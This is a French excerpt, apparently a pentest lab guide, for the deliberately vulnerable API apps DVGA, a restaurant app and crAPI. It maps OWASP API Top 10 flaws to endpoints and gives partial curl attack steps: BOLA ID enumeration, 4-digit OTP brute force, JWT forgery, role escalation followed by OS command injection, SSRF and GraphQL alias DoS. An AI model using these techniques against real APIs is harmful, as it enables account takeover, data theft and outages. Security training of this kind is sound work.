...
Toutes les interactions DVGA utilisent un endpoint unique (`/dvga/graphql`) avec des requêtes POST contenant des charges JSON `{"query":"..."}`.
...
**Attaque par alias (1000 opérations aliasées) :**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
...
# Obtenir le jeton JWT (NOTE : form-encoded, pas JSON)
...
| `/restaurant/profile` | PATCH | Oui | Tous | **BOPLA** (assignation massive de rôle) |
| `/restaurant/users/update_role` | PUT | Oui | Tous | **BFLA** (escalade de rôle) |
...
| `/restaurant/menu/{item_id}` | DELETE | Oui | Tous | **BFLA** (tout utilisateur peut supprimer) |
| `/restaurant/orders` | GET | Oui | Tous | **BOLA** (voir toutes les commandes) |
...
| `/restaurant/orders/status/{order_id}` | GET | Oui | Tous | Statut de la commande |
...
| `/restaurant/apply-referral` | POST | Oui | Tous | Appliquer un parrainage |
...
**Sonder les endpoints internes via image_url du menu (nécessite le rôle Employee) :**
```bash
...
**Injection de commandes OS via les statistiques disque (nécessite le rôle Chef) :**
```bash
# Après avoir escaladé vers Chef :
...
# Accédez à ${CRAPI}/mailhog/ ou utilisez l'API MailHog :
...
# 3. Connexion et obtention du jeton JWT
...
| `/identity/api/auth/forget-password` | POST | Non | Demander un OTP |
| `/identity/api/auth/v2/check-otp` | POST | Non | **Pas de limite de débit** (force brute d'OTP à 4 chiffres) |
...
#### Défi 2 — BOLA : accéder aux rapports mécanicien (sans auth)

```bash
# Énumération par ID séquentiel — aucun jeton nécessaire
for i in 1 2 3 4 5; do
  echo "Report $i:"
...
```bash
# Demander un OTP pour la victime
curl -X POST ${CRAPI}/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# Force brute de l'OTP à 4 chiffres (v2 n'a AUCUNE limitation de débit)
...
curl -sf ${CRAPI}/identity/api/v2/user/videos \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
# Chercher le champ conversion_params dans la réponse
```

#### Défi 6 — DoS : couche 7 via contact mécanicien
...
```bash
# Un utilisateur ordinaire peut accéder à l'endpoint admin
curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
  -H "Authorization: Bearer ${TOKEN}"
```

#### Défis 8 & 9 — Assignation massive : articles gratuits via manipulation de commande

```bash
# Changer GET en PUT, modifier le statut et la quantité
...
#### Défi 11 — SSRF via contact mécanicien
...
# 2. Définir la charge : {"email":"admin@example.com","role":"admin"} et l'encoder en base64url
...
|---|---|---|---|
| **API1 : BOLA** | — | `PUT /profile`, `GET /orders/{id}` | Localisation véhicule, rapports mécanicien, commandes |
| **API2 : Auth défaillante** | Falsification JWT (requête `me`) | Secret JWT faible (97952) | Force brute OTP (v2), confusion d'algorithme JWT |
| **API3 : BOPLA** | — | `PATCH /profile` (escalade de rôle) | conversion_params vidéo, exposition des e-mails mécaniciens |
| **API4 : Consommation de ressources** | DoS par lot, récursion, alias, duplication de champs | Énumération d'utilisateurs via la longueur de réponse | DoS via repeat_request de `contact_mechanic` |
| **API5 : BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | `DELETE /admin/videos` en tant qu'utilisateur ordinaire |
| **API6 : Assignation massive** | — | `PUT /orders` (status, quantity) | Status/quantité de commande, conversion_params vidéo |
| **API7 : SSRF** | Mutation `importPaste` | `PUT /menu` image_url | URL mechanic_api de `contact_mechanic` |
| **API8 : Injection** | SQL (`filter`), XSS (`content`), commande OS (`importPaste`, `systemDiagnostics`) | Commande OS (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`), SQL (`apply_coupon`) |
| **API9 : Gestion inadéquate des actifs** | — | — | `/auth/v2/check-otp` obsolète (pas de limite de débit) |
...
**Test BOLA :** Énumérer les IDs séquentiels, échanger les identifiants utilisateur dans les requêtes, accéder aux ressources sans propriété.
...
**Test de contournement d'authentification :** Falsifier les jetons JWT, force brute des OTP, utiliser des versions d'API obsolètes, confusion d'algorithme.
...
Certaines attaques nécessitent des séquences en plusieurs étapes avec maintien de l'état :

1. **Chaîne d'escalade RESTaurant :** Inscription → Jeton → PATCH du rôle vers Chef → Ré-authentification → Injection de commandes
2. **Flux complet crAPI :** Inscription → Vérification de l'e-mail (MailHog) → Connexion → Ajout de véhicule → Contact mécanicien (SSRF) → Manipulation de commande
...
| Énumération BOLA | 100-500 | 2 min | Balayage par ID séquentiel |
